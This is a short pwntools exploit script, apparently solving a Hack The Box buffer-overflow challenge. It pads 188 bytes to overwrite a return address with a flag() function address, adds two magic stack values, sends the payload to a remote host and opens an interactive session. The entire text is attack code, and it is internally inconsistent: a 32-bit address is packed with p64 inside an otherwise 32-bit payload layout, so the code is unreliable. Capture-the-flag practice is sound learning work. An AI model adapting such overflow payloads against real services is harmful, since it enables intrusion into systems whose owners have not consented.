from pwn import *

# Address of the flag() function found in the binary
target_address = p64(0x08049182)  # Replace with the correct address

# Values that must match the stack comparators
val1 = p32(0xdeadbeef)
val2 = p32(0xc0ded00d)

# Creating the payload
overflow = b"A" * 188  # Padding up to the return address
payload = overflow + target_address + b"BBBB" + val1 + val2

# Connecting to the HTB instance
p = remote("challenge.htb", 1337)  # Replace with the correct IP and port
p.sendline(payload)
p.interactive()
